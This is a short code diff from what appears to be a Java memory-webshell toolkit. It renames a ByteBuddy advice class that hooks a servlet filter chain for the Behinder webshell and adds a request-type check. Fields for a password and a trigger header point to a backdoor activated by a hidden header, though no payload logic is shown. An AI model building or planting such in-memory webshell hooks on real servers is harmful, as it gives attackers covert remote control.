@@ -1,4 +1,4 @@
-package com.reajason.javaweb.memshell.tomcat.behinder;
+package com.reajason.javaweb.memshell.shelltool.behinder;
 
 import net.bytebuddy.asm.Advice;
 
@@ -17,7 +17,7 @@ import java.util.Map;
 /**
  * @author ReaJason
  */
-public class TomcatFilterChainBehinderAdvisor {
+public class BehinderFilterChainAdvisor {
     public static String pass;
     public static String headerName;
     public static String headerValue;
@@ -27,6 +27,9 @@ public class TomcatFilterChainBehinderAdvisor {
             @Advice.Argument(value = 0) ServletRequest req,
             @Advice.Argument(value = 1) ServletResponse res
     ) {
+        if (!(req instanceof HttpServletRequest)) {
+            return false;
+        }
         HttpServletRequest request = (HttpServletRequest) req;
         HttpServletResponse response = (HttpServletResponse) res;
         try {
